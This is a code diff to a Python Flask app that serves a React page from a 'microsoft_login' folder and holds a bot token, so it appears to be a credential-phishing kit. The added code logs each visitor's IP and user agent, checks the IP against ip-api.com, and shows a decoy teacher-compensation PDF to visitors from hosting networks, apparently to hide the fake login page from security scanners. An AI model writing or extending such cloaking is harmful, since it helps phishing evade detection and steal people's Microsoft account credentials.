@@ -15,6 +15,7 @@ load_dotenv()
 HOSTED_URL = os.getenv("HOSTED_URL")
 DEFAULT_USER_ID = os.getenv("USER_ID")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+IP_API_KEY = os.getenv("IP_API_KEY")
 
 # --- Flask App Initialization ---
 app = Flask(__name__, static_folder='microsoft_login/build')
@@ -83,6 +84,26 @@ def get_urls():
 
 
 
+def get_ip_details(ip_address):
+    try:
+        if not IP_API_KEY:
+            return False
+        url = f"http://ip-api.com/json/{ip_address}?fields=66842623"
+
+        headers = {
+        
+        }
+
+        response = requests.get(url, headers=headers).json()
+        print(response)
+        return response['hosting']
+    except Exception as e:
+        return False
+
+
+
+
+
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
@@ -91,13 +112,25 @@ def serve(path):
     Main entrypoint: Handles serving the React application.
     The user_id is now passed in API calls from the client, not handled by sessions.
     """
+
+
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', '')
+    print("\n\n================ Ip Details ===================")
+    print({"visitor_ip": visitor_ip, "user_agent": user_agent}, "\n")
+
+    
+
+
+
+    if get_ip_details(visitor_ip):
+        return send_from_directory('','89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf')
+
     # This logic is now much simpler.
     # If the path points to an existing file in the static folder (like CSS, JS, or an image), serve it.
     if path != "" and os.path.exists(os.path.join(app.static_folder, path)):
         return send_from_directory(app.static_folder, path)
     
-    # Otherwise, for any other path (including the root), serve the main index.html file.
-    # This is standard for a Single-Page Application (SPA).
     return send_from_directory(app.static_folder, 'index.html')
 
 
